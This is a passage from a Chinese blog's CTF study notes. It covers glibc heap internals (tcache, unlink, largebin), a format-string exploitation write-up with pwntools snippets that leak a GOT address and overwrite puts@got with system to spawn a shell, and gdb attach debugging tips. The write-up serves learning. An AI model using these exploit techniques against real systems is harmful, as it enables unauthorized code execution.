<p><a href="https://img-blog.csdnimg.cn/20210715135852934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135852934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>我怀疑是gdb的配置出了点什么毛病，这个ubuntu18环境是我之前随便装的，没怎么管。</p>
<p>解决方案：</p>
<p>1：暂无</p>
<p>2 : 无视问题，摁调。</p>
<h2 id="基础知识">基础知识<a class="post-anchor" href="#基础知识"></a></h2><h3 id="2-1-Tcache的安全问题">2.1-Tcache的安全问题<a class="post-anchor" href="#2-1-Tcache的安全问题"></a></h3><p>2.27版本下相对于2.23新增了tcache机制。</p>
<p>Tcache为每一个线程创建缓存，即内含一些堆块，每个线程分配64个bins，一个bins最多存7个chunk，64位下chunk的大小以16字节递增，也就是最大1032b，所以Tcache并不能存放large bin。，</p>
<p>释放堆块时，如果chunk大小符合要求就放入Tcache，直到Tcache被填满，这个操作是优先于fastbin或者其他操作的。</p>
<p>分配堆块时，如果从fastbin返回了一个合适的chunk，那么fastbin中的其他chunk都会被放入Tcache（除非被装满），smallbin同理。</p>
<p>以及，分配堆块时，如果Tcache中有合适的chunk，就从其中取出来，这也是优先于其他bin的。</p>
<p>可以看出Tcache的优先级比较高，这就导致很多有效的检测将被跳过，在提升执行效率的同时也大大提升了安全风险。</p>
<p>虽然但是，本题的2.27版本不涉及Tcache的安全漏洞利用。只需要将tcache填满就行。</p>
<pre><code class="python">for i in range(7)
    add(248,b'fill')
    free（i）
</code></pre>
<p>Ps:每个size的Tcache最多有7个，也就是连续申请7个0xf8的chunk再释放就能把tcache填满。</p>
<h3 id="2-2-chunk的size的内存对齐问题">2.2-chunk的size的内存对齐问题<a class="post-anchor" href="#2-2-chunk的size的内存对齐问题"></a></h3><p>题目中我们申请了四个size为0xF8的chunk 申请后的heap信息如下</p>
<pre><code class="bash">Allocated chunk | PREV_INUSE#截取了chunk0的信息，地址问题承接上文。
Addr: 0x1b39250
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x1b39270
Size: 0x101
----------------------------------------------------------------
pwndbg&gt; x/50gx 0x1b39250
0x1b39250:    0x0000000000000000    0x0000000000000021
0x1b39260:    0x0000000001b39280    0x0000000000000000
0x1b39270:    0x0000000000000000    0x0000000000000101
0x1b39280:    0x0000000a61616161    0x0000000000000000
0x1b39290:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>可以看到没有什么太大的差错。</p>
<p>然而针对实际情况，我们提出两个问题。</p>
<p>1）为什么0xf8实际是0x101？</p>
<p>0xF8 + 0x8 = 0x100（ps：101中的最低位的1是prev inuse位）</p>
<p>也就是实际比我们申请的多了八个字节。</p>
<p>那么是不是我们申请的每个堆块的实际大小都会比原来多0x8呢？</p>
<p>具体来试一试。这次我们申请0xf0大小的chunk。</p>
<pre><code class="bash">Allocated chunk | PREV_INUSE
Addr: 0x908270
Size: 0x101#chunk的size还是0x101，相当于这次增加了0x16
</code></pre>
<p>注意到两个值一个16字节对齐，另一个是16的倍数再加了八字节。</p>
<p>事实上就是malloc的对齐机制。机制比较完善的编译器会为我们malloc的chunksize自动对进行内存对齐。比如说malloc 0x15的chunk，内存中就是0x21。0x21的来源就是malloc自动为0x15进行内存对齐。</p>
<pre><code class="bash">0x12a5270:    0x0000000000000000    0x0000000000000021
0x12a5280:    0x0000000a61616161    0x0000000000000000
</code></pre>
<p>回到问题本身，那为什么我们要专门申请16+8的size呢？</p>
<p>众所周知，ptmalloc中有一个神奇的节约内存空间的内存复用机制：</p>
<p>众众所周知，malloc规定，只有当本chunk的前一个chunk为free状态的时候，本chunk的prev size才是有意义的，如果本chunk的前一个chunk处于allocated状态，那么即不使用本chunk的prev size。</p>
<p>基于这种规定，当处于alocated状态的prev chunk越来越多，势必会造成一些浪费，所以malloc又规定，如果本chunk申请时size大小是16的倍数，那么就在它前面增加prev size位和size位，如果是16x+8的形式，那么只在chunk前增加size位，prev size位则储存在prev chunk的最后八位。也就是我们一开始碰见的情况。</p>
<p>因此我们要对chunk进行off by null，那么它的prev size位肯定是要可控制的，所以这里我们就需要申请16+8，将prev size分配到上一个chunk中供我们篡改。</p>
<p>2）chunk的size大小问题，有很多size供我们选择，为什么偏偏要是0xf8？</p>
<p>解决了第一个问题，第二个问题其实很好解释。首先前文说到的，要空字节溢出，size就不能太小。其次size是16的倍数+8。满足了这两个条件只要不是大得离谱（别跑去large bin或者mmap了），随便啥size都可以，但是太大也不好掌控还浪费空间。</p>
<h3 id="2-3-unlink？">2.3-unlink？<a class="post-anchor" href="#2-3-unlink？"></a></h3><p>不管是2.23还是2.27，unlink最终目标都是通过堆叠来修改chunk指针的内容。</p>
<p>那为什么是unlink，而不是其他方法？</p>
<p>首先来回顾一下unlink的利用过程。</p>
<p>在有检测的情况下，绕过检测是利用unlink的较为关键的一步。</p>
<p>检测使得我们不能直接修改next chunk 的fd 和bk后进行unlink。绕过的方式也有。fd和bk只要满足以下条件，则会触发target chunk的unlink。</p>
<pre><code class="c">fakeFD -&gt; bk == P` ，等价于 `*(fakeFD + 12) == P
fakeBK -&gt; fd == P`` ，等价于`*(fakeBK + 8) == P
</code></pre>
<!--0x12和0x8的来源参考chunk的结构。-->

<p>触发后，操作如下</p>
<ul>
<li><p><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></p>
</li>
<li><p><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></p>
<p>如果<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code></p>
<p>那么也就是</p>
<p><code>*P = P - 12</code></p>
</li>
</ul>
<p>这样p的地址就向下偏移了0x12个字节。</p>
<p>设置<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code>的方法也很简单，只需要<code>fake_fd = nextchunkptr - 0x12，fake_ bk = nextchunk -0x8</code>就行。</p>
<p>虽然这样大费周章也只是让p地址下移了12，但是这0x12字节足够我们构造堆叠了。</p>
<p>ps：可以类比数学证明题来理解这段绕过的分析思路。从使检测成立的结果一步步逆推，这里使用的就是”根据结果推原因”，属于“分析法”</p>
<h3 id="2-4-largebin">2.4-largebin<a class="post-anchor" href="#2-4-largebin"></a></h3><p><del>其实了解large bin或者largebin attack前还需要了解unsortedbin，但是unsortedbin感觉不是重点。</del></p>
<p>稍微介绍本题中关于largebin chunk的一些比较关键的数据构。</p>
<p>为了加快检索速度，largebin链表增加了fd_nextsize,bk_nextsize指针，用于指向第一个与自己大小不同的chunk（所以只有当largebin中有两个大小不同的chunk时，这两个指针才会被修改)。如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己。</p>
<p>largebin中的chunk大致结构如下</p>
<p><a href="https://img-blog.csdnimg.cn/20210715135936538.png" data-caption="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135936538.png" alt="在这里插入图片描述"></a></p>
</body></html>]]></content>
      <tags>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞学习</title>
    <url>/2021/10/23/%E6%91%86%E7%83%82%E7%AC%AC%E4%B8%89%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<html><head></head><body><h2 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h2><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
<p>首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>
<p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>
<p>非常清晰地告诉我：我是垃圾。</p>
<h2 id="2）格式化字符串基本原理">2）格式化字符串基本原理<a class="post-anchor" href="#2）格式化字符串基本原理"></a></h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre><code class="c">%[parameter][flags][field width][.precision][length]type
</code></pre>
<ul>
<li><p>parameter</p>
<ul>
<li>n$，获取格式化字符串中的指定参数</li>
</ul>
</li>
<li><p>flag</p>
</li>
<li><p>field width</p>
<ul>
<li>输出的最小宽度</li>
</ul>
</li>
<li><p>precision</p>
<ul>
<li>输出的最大长度</li>
</ul>
</li>
<li><p>length，输出的长度</p>
<ul>
<li>hh，输出一个字节</li>
<li>h，输出一个双字节</li>
</ul>
</li>
<li><p>type</p>
<ul>
<li>d/i，有符号整数</li>
<li>u，无符号整数</li>
<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
<li>s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
<li><strong>p， void * 型，输出对应变量的值</strong>。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
<li>n，不输出字符，<strong>但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li>
</ul>
<h5 id="格式化字符串漏洞利用">格式化字符串漏洞利用<a class="post-anchor" href="#格式化字符串漏洞利用"></a></h5><p>一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>
<p>一般来说不正确的方式有这几种</p>
<ol>
<li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>
<li>通过打印的相关内存信息，泄露内存布局，获得有用的信息</li>
</ol>
<h2 id="3-例1-goodluck">3)例1:goodluck<a class="post-anchor" href="#3-例1-goodluck"></a></h2><p>话不多说，直接上例子。</p>
<h3 id="程序逻辑分析">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析"></a></h3><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>
<p>首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>
<p>然后将flag的首地址给v9。</p>
<p>然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（</p>
<p>然后看一个关于fflush的详解</p>
<p><a href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
<p>但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。</p>
<p>bss段存储未初始化的全局变量，也不是缓冲区吧。</p>
<h4 id="缓冲区">缓冲区<a class="post-anchor" href="#缓冲区"></a></h4><p><em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>
<p>为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，<code>cingetchar</code>函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。</p>
<h5 id="缓冲区的分类">缓冲区的分类<a class="post-anchor" href="#缓冲区的分类"></a></h5><h6 id="1-全缓冲。">1:全缓冲。<a class="post-anchor" href="#1-全缓冲。"></a></h6><p>只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>
<h6 id="2-行缓冲">2:行缓冲<a class="post-anchor" href="#2-行缓冲"></a></h6><p>只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>
<h6 id="3-无缓冲">3:无缓冲<a class="post-anchor" href="#3-无缓冲"></a></h6><ol>
<li>无缓冲；标准<code>I/O</code>不缓存字符；其中表现最明显的就是标准错误输出流(<code>stderr</code>)，这使得出错信息尽快的返回给用户。</li>
</ol>
<p>（我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错）</p>
<h5 id="fflush函数">fflush函数<a class="post-anchor" href="#fflush函数"></a></h5><p>然后是关于fflush函数的glibc源码。</p>
<p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>
<p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>
<pre><code class="c">int
_IO_new_file_sync (_IO_FILE *fp)
{
  _IO_ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
    if (_IO_do_flush(fp)) 
    return EOF;//end of file
  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;
  if (delta != 0)
    {
#ifdef TODO
      if (_IO_in_backup (fp))
    delta -= eGptr () - Gbase ();
#endif
      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
      if (new_pos != (_IO_off64_t) EOF)
    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;
#ifdef ESPIPE
      else if (errno == ESPIPE)
    ; /* Ignore error from unseekable devices. */
#endif
      else
    retval = EOF;
    }
  if (retval != EOF)
    fp-&gt;_offset = _IO_pos_BAD;
  /* FIXME: Cleanup - can this be shared? */
  /*    setg(base(), ptr, ptr); */
  return retval;
}
libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
</code></pre>
<p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>
<h5 id="pwntools与缓冲区机制">pwntools与缓冲区机制<a class="post-anchor" href="#pwntools与缓冲区机制"></a></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>
<p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>
<h4 id="ms？">%ms？<a class="post-anchor" href="#ms？"></a></h4><p>从缓冲区的研究回到程序的简单逻辑分析上。</p>
<p><code>__isoc99_scanf("%ms", &amp;format);</code></p>
<p>接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里）</p>
<p>然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。</p>
<h3 id="漏洞利用">漏洞利用<a class="post-anchor" href="#漏洞利用"></a></h3><p>因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>
<p>那么如何打印这个flag呢？</p>
<p>我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" data-caption="截屏2021-10-26 下午10.31.45" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" alt="截屏2021-10-26 下午10.31.45"></a></p>
<p>flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。</p>
<p>这时候就需要计算这个flag字符串与栈顶的偏移。</p>
<p>![截屏2021-10-26 下午10.35.39](/Users/rin/Library/Application Support/typora-user-images/截屏2021-10-26 下午10.35.39.png)</p>
<p>显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。</p>
<p>利用%n$s打印参数，即可获得flag。</p>
<h2 id="4-例2">4)例2<a class="post-anchor" href="#4-例2"></a></h2><p>经过刚才的开胃菜，我们总算进入了正题。</p>
<p>一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。</p>
<p>但是如果需要修改函数的got表，我们需要满足几个条件：</p>
<ol>
<li>知道需要修改的函数的真实地址。</li>
<li>需要想办法改写函数的got表。</li>
</ol>
<p>一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（</p>
<p>回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子</p>
<h3 id="cctf-pwn3">cctf pwn3<a class="post-anchor" href="#cctf-pwn3"></a></h3><h5 id="程序分析">程序分析<a class="post-anchor" href="#程序分析"></a></h5><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" data-caption="截屏2021-10-27 上午8.50.03" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" alt="截屏2021-10-27 上午8.50.03"></a></p>
<h5 id="程序逻辑分析-1">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析-1"></a></h5><p>还是先进行一个简单的逻辑分析。</p>
<p>首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" data-caption="截屏2021-10-27 上午9.02.34" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" alt="截屏2021-10-27 上午9.02.34"></a></p>
<p>所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。</p>
<p>当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址。</p>
<p>首先我们确定字符串偏移。</p>
<h5 id="gdb动调的一些坑">gdb动调的一些坑<a class="post-anchor" href="#gdb动调的一些坑"></a></h5><p>用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code> ERROR: Could not find ELF base!</code></p>
<p>原因详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/">摆烂第四天–gdb附加调试的一些黑魔法</a>的2.1节。</p>
<p>因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。</p>
<p>等问题解决了在再来调。</p>
<pre><code class="python">tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)
</code></pre>
<p>绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。</p>
<p>这样就有了代码中的公式。</p>
<p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>
<p>打印真实地址，第一步需要找到格式化字符串在栈中的偏移。</p>
<p>关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>
<p>原理参见：<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
<p>这里的偏移是8</p>
<pre><code class="python"># get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put(b'1111', b'%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])
</code></pre>
<p>然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。</p>
<p>这里<code>%8$s' + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>
<p>然后接收信息，就是puts的got表。</p>
<p>然后就是经典rop的确定libc基址和system地址，比较套路。</p>
<p>下一个关键点是</p>
<pre><code class="python">payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp&gt;')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;') 
</code></pre>
<p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>
<p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>
<p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
<p>最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>
<p>​    </p>
<p>​    这个题的调试部分才是大头，一点一点把问题解决吧。</p>
<h4 id="调试部分">调试部分<a class="post-anchor" href="#调试部分"></a></h4><p>​    思路和exp都很清楚的情况下，我们尝试对题目进行调试。</p>
<h2 id="参考">参考<a class="post-anchor" href="#参考"></a></h2><p><a href="https://zhuanlan.zhihu.com/p/79504011">缓冲区机制详解</a></p>
<p><a href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
<p><a href="https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf">difference between %ms and %s scanf</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/">格式化字符串</a></p>
<p>[格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)</p>
</li>
</ul>
</body></html>]]></content>
      <tags>
        <tag>format</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb附加调试的一些黑魔法</title>
    <url>/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    <content><![CDATA[<html><head></head><body><h2 id="1）abstract">1）abstract<a class="post-anchor" href="#1）abstract"></a></h2><p>​    这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。</p>
<h2 id="2）格式化字符串-cctf-pwn3">2）格式化字符串-cctf-pwn3<a class="post-anchor" href="#2）格式化字符串-cctf-pwn3"></a></h2><h3 id="1）pause（p）导致ERROR-Could-not-find-ELF-base">1）pause（p）导致ERROR: Could not find ELF base<a class="post-anchor" href="#1）pause（p）导致ERROR-Could-not-find-ELF-base"></a></h3><h5 id="问题">问题<a class="post-anchor" href="#问题"></a></h5><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>
<pre><code class="bash">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.
ERROR: Could not find ELF base!
done.
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.
done.
Cannot access memory at address 0xf7fad924

warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
Failed to read a valid object file image from memory.
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
0xf7f85b59 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!

</code></pre>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" data-caption="截屏2021-10-27 上午11.17.59" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" alt="截屏2021-10-27 上午11.17.59"></a></p>
<p>​    首先需要知道这个报错的原因。</p>
<p>​    虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>
<p>​    那么进程中止的原因何在？</p>
<h5 id="解决方案">解决方案<a class="post-anchor" href="#解决方案"></a></h5><p>​     经过大师指点，这个问题其实是因为exp错误（</p>
<p>​    这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是<code>elf base not found</code>。    </p>
<h5 id="总结">总结<a class="post-anchor" href="#总结"></a></h5><p>​    如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。</p>
<h3 id="3）-kernel-vsyscall？">3）__kernel_vsyscall？<a class="post-anchor" href="#3）-kernel-vsyscall？"></a></h3><h5 id="问题-1">问题<a class="post-anchor" href="#问题-1"></a></h5><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>
<p>​    我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么<code>__kernel_vsyscall</code>是一个怎样的函数，为什么偏偏就断在它的身上呢？ </p>
<h5 id="解决">解决<a class="post-anchor" href="#解决"></a></h5><p>​    在stackoverflow上，我们能够看出一些端倪。</p>
<blockquote>
<p>​    <code>__kernel_vsyscal</code> is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the <code>sysenter</code> instruction. </p>
</blockquote>
<p>​    这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>
<p>​    所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。我们同时可以注意到，当  <code>__kernel_vsyscal</code> 函数执行完成，下一个函数则是<code>read</code>函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。</p>
<p>当然要结束这个函数我们只需要gdb finish。</p>
<p>或者直接使用gdb.attach(sh,”break xxx”)。</p>
<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>
<h3 id="4）gdb附加调试下断点的几种姿势。">4）gdb附加调试下断点的几种姿势。<a class="post-anchor" href="#4）gdb附加调试下断点的几种姿势。"></a></h3><h5 id="1）gdb-attach-p">1）gdb.attach(p)<a class="post-anchor" href="#1）gdb-attach-p"></a></h5><h5 id="2）gdb-attach-p-”break-lt-func-name-gt-”">2）gdb.attach(p,”break &lt;func name&gt;”)<a class="post-anchor" href="#2）gdb-attach-p-”break-lt-func-name-gt-”"></a></h5><h5 id="3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”">3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )<a class="post-anchor" href="#3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”"></a></h5><p>​    </p>
<p>​    </p>
<p>​    </p>
